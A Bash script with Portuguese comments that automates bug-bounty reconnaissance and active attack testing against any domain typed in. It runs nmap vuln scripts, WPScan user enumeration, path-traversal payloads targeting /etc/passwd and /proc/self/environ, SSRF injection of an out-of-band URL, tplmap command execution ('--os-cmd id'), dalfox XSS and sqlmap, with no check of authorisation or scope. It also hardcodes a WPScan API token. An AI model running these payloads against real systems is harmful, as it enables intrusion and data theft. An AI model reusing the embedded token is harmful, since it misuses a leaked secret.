#!/usr/bin/env bash
# Recon Menu — Bug Bounty com checagem WP por URLs, contadores e testes direcionados (sem fuzzing)
# 1) Nmap Full (todas as portas + vuln)
# 2) Bug Bounty (subs -> takeover -> httpx(tmp) -> URLs -> WP auto -> gf -> testes)
# 3) WPScan completo (token fixo manual)
# 4) Passivo (whois, whatweb, DNS, WAF/CDN/IP)
# q) Sair

set -euo pipefail

# ===== UI =====
C0="\033[0m"; CB="\033[34m"; CG="\033[32m"; CY="\033[33m"; CR="\033[31m"; CW="\033[97m"; B="\033[1m"; DIM="\033[2m"
log(){  echo -e "${CB}ℹ${C0}  $*"; }
ok(){   echo -e "${CG}✔${C0}  $*"; }
warn(){ echo -e "${CY}⚠${C0}  $*"; }
err(){  echo -e "${CR}✖${C0}  $*" >&2; }
need(){ command -v "$1" >/dev/null 2>&1 || { err "ferramenta ausente: $1"; return 1; }; }
countf(){ [[ -f "$1" ]] && wc -l < "$1" || echo 0; }
sanitize_domain(){ local d="$1"; d="${d#http://}"; d="${d#https://}"; d="${d%%/*}"; echo "$d"; }
banner(){ local t="$1"; local l=$(printf "%*s" $(( ${#t} + 6 )) | tr " " "═"); echo -e "${CW}${B}╔${l}╗${C0}"; printf "${CW}${B}║   ${C0}${B}%s${CW}${B}   ║${C0}\n" "$t"; echo -e "${CW}${B}╚${l}╝${C0}"; }
hr(){ echo -e "${DIM}────────────────────────────────────────────────────────${C0}"; }
print_top(){ # print up to N lines of file with prefix
  local file="$1" n="${2:-5}" prefix="${3:-"  • "}"
  [[ -s "$file" ]] || return 0
  local i=0
  while IFS= read -r l; do
    i=$((i+1)); printf "%s%s\n" "$prefix" "$l"
    [[ $i -ge $n ]] && break
  done < "$file"
  [[ $(countf "$file") -gt $n ]] && echo "${DIM}  … ($(countf "$file") total)${C0}"
}

prep_dirs(){ DOMAIN="$1"; BASE="$HOME/recon/$DOMAIN"; TMP="/tmp/recon-$DOMAIN"; mkdir -p "$BASE"/{intel,subs,urls,vectors,findings} "$TMP" "$TMP/urls"; }

# ===== Python helpers para URLs =====
make_url_variants() { # um param por vez -> NEWVAL
  local NEWVAL="$1"
  python3 - "$NEWVAL" <<'PY'
import sys, urllib.parse
newval = sys.argv[1]
for raw in sys.stdin:
    raw = raw.strip()
    if not raw or '?' not in raw: continue
    try:
        u = urllib.parse.urlsplit(raw)
        qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
        if not qs: continue
        for i,(k,v) in enumerate(qs):
            qs2 = list(qs); qs2[i] = (k, newval)
            new_query = urllib.parse.urlencode(qs2, doseq=True)
            print(urllib.parse.urlunsplit((u.scheme,u.netloc,u.path,new_query,u.fragment)))
    except Exception:
        pass
PY
}

replace_param_value_all() { # todos os params -> NEWVAL
  local URL="$1" NEWVAL="$2"
  python3 - "$URL" "$NEWVAL" <<'PY'
import sys, urllib.parse
url = sys.argv[1]; newval = sys.argv[2]
u = urllib.parse.urlsplit(url)
qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
if not qs:
    print(url); sys.exit(0)
qs2 = [(k,newval) for k,_ in qs]
new_query = urllib.parse.urlencode(qs2, doseq=True)
print(urllib.parse.urlunsplit((u.scheme,u.netloc,u.path,new_query,u.fragment)))
PY
}

host_from_url(){
  python3 - "$1" <<'PY'
import sys, urllib.parse
u=sys.argv[1].strip()
try:
  print(urllib.parse.urlsplit(u).netloc.split(":")[0])
except: print("")
PY
}

# ===== Testadores direcionados =====
test_redirects(){ # verifica Location apontando para CANARY (sem fuzz list)
  need curl || return 0
  local list="$1" out="$2"; : > "$out"
  local CANARY="${REDIR_CANARY:-https://example.com/}"
  local total=$(countf "$list"); local i=0; local found=0
  [[ $total -eq 0 ]] && { ok "Open Redirect: nenhum vetor"; return 0; }
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[Redirect]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    while IFS= read -r testurl; do
      code=$(curl -s -I -m 10 -o /tmp/rd_hdr.$$ -w '%{http_code}' "$testurl" || true)
      if [[ "$code" =~ ^30[1278]$ ]] && grep -qi "^Location:.*$CANARY" /tmp/rd_hdr.$$ 2>/dev/null; then
        echo "$url -> $testurl" >> "$out"; found=$((found+1)); break
      fi
    done < <(printf "%s\n" "$url" | make_url_variants "$CANARY")
  done < "$list"
  echo
  if [[ -s "$out" ]]; then
    ok "Open Redirect: $found positivos | $out"
    print_top "$out" 5 "    ↳ "
  else
    ok "Open Redirect: nenhum resultado"
  fi
}

test_lfi(){ # payloads curados + assinaturas
  need curl || return 0
  local list="$1" out="$2"; : > "$out"
  local payloads=("../../etc/passwd" "..%2f..%2fetc%2fpasswd" "..%252f..%252fetc%252fpasswd" "../../proc/self/environ" "../../windows/win.ini")
  local total=$(countf "$list"); local i=0; local hits=0
  [[ $total -eq 0 ]] && { ok "LFI: nenhum vetor"; return 0; }
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[LFI]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    for p in "${payloads[@]}"; do
      testurl=$(replace_param_value_all "$url" "$p")
      body=$(curl -s --max-time 10 "$testurl" || true)
      if echo "$body" | grep -Eq '^root:.*:0:0:'; then echo "[PASSWD] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
      if echo "$body" | grep -Eq '^\[extensions\]|\[fonts\]'; then echo "[WININI] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
      if echo "$body" | grep -Eq '(^|;)PATH=|HTTP_USER_AGENT='; then echo "[ENV] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
    done
  done < "$list"
  echo
  if [[ -s "$out" ]]; then
    ok "LFI: $hits positivos | $out"
    print_top "$out" 5 "    ↳ "
  else
    ok "LFI: nenhum resultado"
  fi
}

test_ssrf(){ # OOB necessário (COLLAB_URL)
  need curl || return 0
  local list="$1" out="$2"; : > "$out"
  local OOB="${COLLAB_URL:-}"
  [[ -z "$OOB" ]] && { warn "SSRF desativado (defina COLLAB_URL)"; return 0; }
  local total=$(countf "$list"); local i=0; local sent=0
  [[ $total -eq 0 ]] && { ok "SSRF: nenhum vetor"; return 0; }
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[SSRF]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    testurl=$(replace_param_value_all "$url" "$OOB")
    curl -s --max-time 10 "$testurl" >/dev/null 2>&1 || true
    echo "$url -> $testurl" >> "$out"; sent=$((sent+1))
  done < "$list"
  echo
  ok "SSRF: $sent requisições enviadas ao OOB | verifique seu listener | $out"
  print_top "$out" 3 "    ↳ "
}

test_ssti(){ # tplmap
  local list="$1" out="$2"; : > "$out"
  if ! command -v tplmap >/dev/null 2>&1; then
    warn "tplmap não encontrado; SSTI desativado."
    return 0
  fi
  local total=$(countf "$list"); local i=0; local pos=0
  [[ $total -eq 0 ]] && { ok "SSTI: nenhum vetor"; return 0; }
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[SSTI]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
    tplmap -u "$url" --os-cmd id --timeout 8 --quiet >/tmp/tpl.$$ 2>/dev/null || true
    if grep -qiE "(command output|uid=[0-9])" /tmp/tpl.$$ 2>/dev/null; then echo "$url" >> "$out"; pos=$((pos+1)); fi
  done < "$list"
  echo
  if [[ -s "$out" ]]; then
    ok "SSTI: $pos positivos | $out"
    print_top "$out" 5 "    ↳ "
  else
    ok "SSTI: nenhum resultado"
  fi
}

# ===== Opção 1: Nmap =====
run_nmap(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"; need nmap || return 1
  banner "Nmap — $DOMAIN"
  log "executando (all TCP + default+vuln)…"
  local out="$BASE/intel/nmap_all.txt"
  nmap -p- -sS -sV -sC --script vuln -T4 -Pn -n \
       --defeat-rst-ratelimit --max-retries 2 --host-timeout 30m \
       -oN "$out" "$DOMAIN" >/dev/null 2>&1 || warn "nmap retornou avisos"
  ok "concluído: $(countf "$out") linhas → $out"
  hr
}

# ===== Opção 2: Bug Bounty =====
run_bug_bounty(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"
  local tools=(subfinder assetfinder httpx subzy gau waybackurls katana gf python3 curl)
  for t in "${tools[@]}"; do need "$t" || { err "falta $t"; return 1; }; done

  banner "Bug Bounty — $DOMAIN"

  # Subdomínios
  log "Subdomínios (subfinder + assetfinder)…"
  subfinder -d "$DOMAIN" -all -silent > "$TMP/subs1.txt" || true
  assetfinder --subs-only "$DOMAIN"   | sort -u > "$TMP/subs2.txt" || true
  cat "$TMP"/subs*.txt 2>/dev/null | sort -u > "$BASE/subs/subdomains_all.txt" || true
  local SUBS_TOTAL=$(countf "$BASE/subs/subdomains_all.txt")
  ok "subdomínios encontrados: ${B}${SUBS_TOTAL}${C0}"
  print_top "$BASE/subs/subdomains_all.txt" 5 "    ↳ "

  # Takeover
  log "Takeover (subzy)…"
  : > "$BASE/subs/takeover.txt"
  subzy run --targets "$BASE/subs/subdomains_all.txt" --hide_fails --verify_ssl --concurrency 50 \
       -o "$BASE/subs/takeover.txt" >/dev/null 2>&1 || true
  local TAKE_POS=$(grep -i "vulnerable" "$BASE/subs/takeover.txt" 2>/dev/null | wc -l | tr -d ' ')
  ok "takeover verificados: ${SUBS_TOTAL} | positivos: ${B}${TAKE_POS}${C0} | $BASE/subs/takeover.txt"
  [[ $TAKE_POS -gt 0 ]] && print_top "$BASE/subs/takeover.txt" 5 "    ↳ "

  # HTTPX (tmp)
  log "HTTPX (filtrando vivos)…"
  httpx -l "$BASE/subs/subdomains_all.txt" -silent -status-code -title -tech-detect -server -ip -tls -cdn -location \
       -o "$TMP/httpx_live.txt" >/dev/null 2>&1 || true
  cut -d' ' -f1 "$TMP/httpx_live.txt" > "$TMP/subdomains_live.txt" || true
  local LIVE=$(countf "$TMP/subdomains_live.txt"); local LIVE_PCT=0
  [[ $SUBS_TOTAL -gt 0 ]] && LIVE_PCT=$((100*LIVE/SUBS_TOTAL))
  ok "hosts vivos (tmp): ${B}${LIVE}${C0} (${LIVE_PCT}%)"
  [[ $LIVE -gt 0 ]] && print_top "$TMP/subdomains_live.txt" 5 "    ↳ "

  # URLs
  log "Coleta de URLs…"
  : > "$BASE/urls/urls_all.txt"; mkdir -p "$TMP/urls"
  echo "$DOMAIN" | gau --subs --providers wayback,commoncrawl,otx > "$TMP/urls/gau.txt" 2>/dev/null || true
  echo "$DOMAIN" | waybackurls                                  > "$TMP/urls/wayback.txt" 2>/dev/null || true
  if [[ $LIVE -gt 0 ]]; then
    katana -list "$TMP/subdomains_live.txt" -depth 3 -silent > "$TMP/urls/katana.txt" 2>/dev/null || true
  else
    katana -u "https://$DOMAIN" -depth 2 -silent > "$TMP/urls/katana.txt" 2>/dev/null || true
  fi
  cat "$TMP/urls"/*.txt 2>/dev/null | sed 's/\s\+$//' | sort -u > "$BASE/urls/urls_all.txt" || true
  local GAU=$(countf "$TMP/urls/gau.txt"); local WB=$(countf "$TMP/urls/wayback.txt"); local KAT=$(countf "$TMP/urls/katana.txt")
  local URLS=$(countf "$BASE/urls/urls_all.txt")
  ok "URLs: gau=${B}$GAU${C0} | wayback=${B}$WB${C0} | katana=${B}$KAT${C0} | total=${B}$URLS${C0} → $BASE/urls/urls_all.txt"
  print_top "$BASE/urls/urls_all.txt" 5 "    ↳ "
  hr

  # WordPress auto (a partir de URLs)
  log "Detectando WordPress por URLs (wp-content/wp-includes/wp-json/wp-admin)…"
  local WP_IND="$TMP/wp_hits.txt"; : > "$WP_IND"
  grep -Eiq 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt" && \
    grep -Ei 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt" > "$WP_IND" || true
  local WP_URL_HITS=$(countf "$WP_IND")
  if [[ $WP_URL_HITS -gt 0 ]]; then
    ok "indicadores WP em URLs: ${B}${WP_URL_HITS}${C0}"
    # extrair hosts únicos e rodar wpscan por domínio
    local WP_HOSTS="$TMP/wp_hosts.txt"; : > "$WP_HOSTS"
    while IFS= read -r u; do host_from_url "$u"; done < "$WP_IND" | sed '/^$/d' | sort -u > "$WP_HOSTS"
    local TOKEN_DEFAULT="GRa5RV3wTapgEXZKKMcdQwZD3F9jwTYHaBMb4swZ05Q"
    local TOKEN="${WPVULNDB_API_TOKEN:-$TOKEN_DEFAULT}"
    if command -v wpscan >/dev/null 2>&1; then
      while IFS= read -r h; do
        [[ -z "$h" ]] && continue
        log "WPScan → https://$h"
        wpscan --url "https://$h" --enumerate u,ap,at,cb,dbe \
               --random-user-agent --disable-tls-checks \
               --api-token "$TOKEN" \
               -o "$BASE/intel/wpscan_$h.txt" >/dev/null 2>&1 || true
        local vcnt=$(grep -i "vulnerab" "$BASE/intel/wpscan_$h.txt" 2>/dev/null | wc -l | tr -d ' ')
        ok "WPScan $h: possíveis ocorrências=${B}${vcnt}${C0} → $BASE/intel/wpscan_$h.txt"
      done < "$WP_HOSTS"
    else
      warn "wpscan não encontrado; pulei WP auto."
    fi
  else
    warn "nenhum indicador WP nas URLs."
  fi
  hr

  # Vetores (gf)
  log "Classificando vetores (gf)…"
  grep -E '\?.+=' "$BASE/urls/urls_all.txt" > "$BASE/urls/urls_with_params.txt" || true
  gf xss      < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/xss.txt"      || true
  gf sqli     < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/sqli.txt"     || true
  gf redirect < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/redirect.txt" || true
  gf lfi      < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/lfi.txt"      || true
  gf ssrf     < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/ssrf.txt"     || true
  gf ssti     < "$BASE/urls/urls_with_params.txt" > "$BASE/vectors/ssti.txt"     || true
  ok "Vetores → XSS=$(countf "$BASE/vectors/xss.txt") | SQLi=$(countf "$BASE/vectors/sqli.txt") | Redirect=$(countf "$BASE/vectors/redirect.txt") | LFI=$(countf "$BASE/vectors/lfi.txt") | SSRF=$(countf "$BASE/vectors/ssrf.txt") | SSTI=$(countf "$BASE/vectors/ssti.txt")"
  hr

  # Testadores direcionados (sem fuzzing)
  [[ -s "$BASE/vectors/redirect.txt" ]] && { log "Testando Open Redirect…"; test_redirects "$BASE/vectors/redirect.txt" "$BASE/findings/redirect.txt"; hr; }
  [[ -s "$BASE/vectors/lfi.txt"      ]] && { log "Testando LFI…";            test_lfi       "$BASE/vectors/lfi.txt"      "$BASE/findings/lfi.txt"; hr; }
  [[ -s "$BASE/vectors/ssrf.txt"     ]] && { log "Testando SSRF…";           test_ssrf      "$BASE/vectors/ssrf.txt"     "$BASE/findings/ssrf.txt"; hr; }
  [[ -s "$BASE/vectors/ssti.txt"     ]] && { log "Testando SSTI (tplmap)…";  test_ssti      "$BASE/vectors/ssti.txt"     "$BASE/findings/ssti.txt"; hr; }

  # XSS (dalfox) com progresso, silencioso
  if command -v dalfox >/dev/null 2>&1 && [[ -s "$BASE/vectors/xss.txt" ]]; then
    log "Testando XSS (dalfox, POC)…"
    local TOTAL=$(countf "$BASE/vectors/xss.txt"); local i=0; : > "$BASE/findings/xss.dalfox.txt"
    while IFS= read -r u; do
      i=$((i+1)); local pct=$((i*100/TOTAL)); printf "\r${CB}[XSS]${C0} %d/%d (%d%%)" "$i" "$TOTAL" "$pct"
      dalfox url "$u" --only-poc --no-color --silence --format plain >> "$BASE/findings/xss.dalfox.txt" 2>/dev/null || true
    done < "$BASE/vectors/xss.txt"
    echo
    if [[ -s "$BASE/findings/xss.dalfox.txt" ]]; then
      ok "XSS positivos: $(countf "$BASE/findings/xss.dalfox.txt") → $BASE/findings/xss.dalfox.txt"
      print_top "$BASE/findings/xss.dalfox.txt" 5 "    ↳ "
    else
      ok "XSS: nenhum resultado"
    fi
    hr
  fi

  # SQLi com sqlmap (rápido)
  if command -v sqlmap >/dev/null 2>&1 && [[ -s "$BASE/vectors/sqli.txt" ]]; then
    log "Testando SQLi (sqlmap rápido)…"
    sqlmap -m "$BASE/vectors/sqli.txt" --batch --random-agent --level=2 --risk=1 --threads=5 --time-sec=5 -v 0 \
           --results-dir="$TMP/sqlmap" >/dev/null 2>&1 || true
    grep -RHiE "is vulnerable|appears to be injectable|parameter .* is vulnerable" "$TMP/sqlmap" 2>/dev/null \
      | sort -u > "$BASE/findings/sqli.txt" || true
    if [[ -s "$BASE/findings/sqli.txt" ]]; then
      ok "SQLi positivos: $(countf "$BASE/findings/sqli.txt") → $BASE/findings/sqli.txt"
      print_top "$BASE/findings/sqli.txt" 5 "    ↳ "
    else
      ok "SQLi: nenhum resultado"
    fi
    hr
  fi

  banner "Resumo — $DOMAIN"
  echo "  • Subdomínios: $SUBS_TOTAL | Vivos(tmp): $LIVE"
  echo "  • URLs total:  $URLS"
  echo "  • WP auto:     $WP_URL_HITS URLs indicaram WP"
  echo "  • Vetores:     XSS=$(countf "$BASE/vectors/xss.txt"), SQLi=$(countf "$BASE/vectors/sqli.txt"), Redir=$(countf "$BASE/vectors/redirect.txt"), LFI=$(countf "$BASE/vectors/lfi.txt"), SSRF=$(countf "$BASE/vectors/ssrf.txt"), SSTI=$(countf "$BASE/vectors/ssti.txt")"
  echo "  • Findings:    XSS=$(countf "$BASE/findings/xss.dalfox.txt"), SQLi=$(countf "$BASE/findings/sqli.txt")"
  [[ -f "$BASE/findings/redirect.txt" ]] && echo "                 Redirect=$(countf "$BASE/findings/redirect.txt")"
  [[ -f "$BASE/findings/lfi.txt"      ]] && echo "                 LFI=$(countf "$BASE/findings/lfi.txt")"
  [[ -f "$BASE/findings/ssrf.txt"     ]] && echo "                 SSRF(out)=$(countf "$BASE/findings/ssrf.txt")"
  [[ -f "$BASE/findings/ssti.txt"     ]] && echo "                 SSTI=$(countf "$BASE/findings/ssti.txt")"
  hr
}

# ===== Opção 3: WPScan manual (token fixo) =====
run_wpscan(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"; need wpscan || return 1
  banner "WPScan — $DOMAIN"
  local TOKEN="GRa5RV3wTapgEXZKKMcdQwZD3F9jwTYHaBMb4swZ05Q"
  log "executando WPScan completo…"
  wpscan --url "https://$DOMAIN" --enumerate u,ap,at,cb,dbe \
         --random-user-agent --disable-tls-checks \
         --api-token "$TOKEN" \
         -o "$BASE/intel/wpscan.txt" >/dev/null 2>&1 || true
  local WP_VULN=$(grep -i "vulnerab" "$BASE/intel/wpscan.txt" 2>/dev/null | wc -l | tr -d ' ')
  ok "salvo → $BASE/intel/wpscan.txt (possíveis ocorrências: ${B}${WP_VULN}${C0})"
  hr
}

# ===== Opção 4: Passivo =====
run_passive(){
  local DOMAIN="$1"; prep_dirs "$DOMAIN"
  banner "Passivo — $DOMAIN"
  mkdir -p "$BASE/intel/passive"
  command -v whois   >/dev/null 2>&1 && { log "WHOIS"; whois "$DOMAIN" > "$BASE/intel/passive/whois.txt" 2>/dev/null || true; }
  command -v whatweb >/dev/null 2>&1 && { log "WhatWeb"; whatweb --color=never --no-errors -a 3 "http://$DOMAIN" "https://$DOMAIN" > "$BASE/intel/passive/whatweb_root.txt" 2>/dev/null || true; }
  command -v dnsx    >/dev/null 2>&1 && { log "DNS"; echo "$DOMAIN" > "$TMP/domain.txt"; dnsx -l "$TMP/domain.txt" -a -aaaa -cname -mx -ns -txt -silent > "$BASE/intel/passive/dns_records.txt" || true; }
  command -v wafw00f >/dev/null 2>&1 && { log "WAF"; wafw00f "https://$DOMAIN" > "$BASE/intel/passive/wafw00f.txt" 2>/dev/null || true; }
  command -v httpx   >/dev/null 2>&1 && { log "HTTPX"; httpx -u "https://$DOMAIN" -silent -status-code -title -tech-detect -server -ip -tls -cdn -location > "$BASE/intel/passive/httpx_root.txt" || true; }
  ok "passivo salvo em $BASE/intel/passive/"
  hr
}

# ===== Menu =====
clear
echo -e "${B}Recon Menu${C0}"
cat <<MENU
1) Nmap Full (todas as portas + vuln)
2) Bug Bounty (subs -> takeover -> httpx(tmp) -> URLs -> WP auto -> gf -> testes)
3) WPScan completo (token fixo manual)
4) Passivo (whois, whatweb, DNS, WAF/CDN/IP)
q) Sair
MENU
read -rp "Escolha: " choice
read -rp "Domínio: " domain; domain=$(sanitize_domain "$domain")

case "$choice" in
  1) run_nmap "$domain" ;;
  2) run_bug_bounty "$domain" ;;
  3) run_wpscan "$domain" ;;
  4) run_passive "$domain" ;;
  *) echo "Saindo…" ;;
esac
